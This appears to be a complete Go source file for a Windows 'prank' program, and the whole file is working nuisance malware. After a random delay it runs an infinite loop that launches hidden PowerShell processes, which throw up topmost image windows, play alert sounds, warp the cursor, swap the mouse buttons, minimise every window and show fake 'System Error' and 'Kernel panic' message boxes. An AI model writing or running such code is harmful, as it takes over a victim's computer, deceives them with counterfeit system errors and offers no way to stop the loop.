package main

import (
	_ "embed"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	procSwapMouseBtn = user32.NewProc("SwapMouseButton")
	activeWindows    int32
)

func setMouseSwap(swapped bool) {
	if swapped {
		procSwapMouseBtn.Call(1)
	} else {
		procSwapMouseBtn.Call(0)
	}
}

func desktopPurge() {
	psScript := `(New-Object -ComObject Shell.Application).MinimizeAll()`
	_ = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript).Run()
}

func errorCascade() {
	psScript := `
		Add-Type -AssemblyName System.Windows.Forms
		$messages = @(
			"Kernel panic: Wlee is here.",
			"Error 404: Wlee is here.",
			"System failure: Wlee is too cool.",
			"Warning: Wlee is here.",
			"Critical Error: Wleee.",
			"Access Denied: Wlee is here.",
			"CPU on fire: Please blow on the motherboard. - Wleee"
		)
		for($i=0; $i -lt 5; $i++) {
			$msg = $messages | Get-Random
			[System.Windows.Forms.MessageBox]::Show($msg, "System Error", 0, 16)
		}
	`
	go func() {
		cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}()
}

//go:embed image.jpg
var imageBytes []byte

func main() {
	// 1. Initial Random Delay (3-10 seconds)
	rand.Seed(time.Now().UnixNano())
	delay := rand.Intn(8) + 3
	time.Sleep(time.Duration(delay) * time.Second)

	// 2. Prepare the Image
	tempDir := os.TempDir()
	tempImagePath := filepath.Join(tempDir, "surprise_img.jpg")
	err := os.WriteFile(tempImagePath, imageBytes, 0644)
	if err != nil {
		return
	}
	defer os.Remove(tempImagePath)

	// 3. The Annoyance Loop (Infinite)
	for {
		// 1 in 3 chance to trigger Global Annoyance
		if rand.Intn(3) == 0 {
			desktopPurge()
			errorCascade()
		}

		// Spawn 1-2 windows concurrently
		numWindows := rand.Intn(2) + 1
		for i := 0; i < numWindows; i++ {
			go showPrank(tempImagePath)
			// Small stagger between windows
			time.Sleep(200 * time.Millisecond)
		}

		// Wait a random, shorter interval (1-4 seconds)
		delay := rand.Intn(3) + 1
		time.Sleep(time.Duration(delay) * time.Second)
	}
}

func showPrank(imagePath string) {
	atomic.AddInt32(&activeWindows, 1)
	setMouseSwap(true)

	defer func() {
		if atomic.AddInt32(&activeWindows, -1) == 0 {
			setMouseSwap(false)
		}
	}()
	psScript := fmt.Sprintf(`
		Add-Type -AssemblyName System.Windows.Forms, System.Drawing
		[System.Windows.Forms.Application]::EnableVisualStyles()
		
		$f = New-Object Windows.Forms.Form
		$f.Text = "Surprise"
		$f.FormBorderStyle = "None"
		$f.TopMost = $true
		$f.BackColor = "Black"
		
		# Play Annoying Sound
		[System.Media.SystemSounds]::Exclamation.Play()
		
		# Random Window Sizing & Positioning
		$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
		$w = $screen.Width * (0.6 + (Get-Random -Minimum 0 -Maximum 40) / 100)
		$h = $screen.Height * (0.6 + (Get-Random -Minimum 0 -Maximum 40) / 100)
		$x = Get-Random -Minimum 0 -Maximum ($screen.Width - $w)
		$y = Get-Random -Minimum 0 -Maximum ($screen.Height - $h)
		
		$f.StartPosition = "Manual"
		$f.Location = New-Object System.Drawing.Point($x, $y)
		$f.Size = New-Object System.Drawing.Size($w, $h)
		
		# Warp Cursor to Random Location
		$cx = Get-Random -Minimum 0 -Maximum $screen.Width
		$cy = Get-Random -Minimum 0 -Maximum $screen.Height
		[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($cx, $cy)
		
		$img = [Drawing.Image]::FromFile('%s')
		$f.BackgroundImage = $img
		$f.BackgroundImageLayout = "Zoom"
		
		# Interaction
		$f.Add_Click({ $f.Close() })
		$f.Add_KeyDown({ if ($_.KeyCode -eq "Escape") { $f.Close() } })
		
		[System.Windows.Forms.Application]::Run($f)
		$img.Dispose()
	`, imagePath)

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	_ = cmd.Run()
}
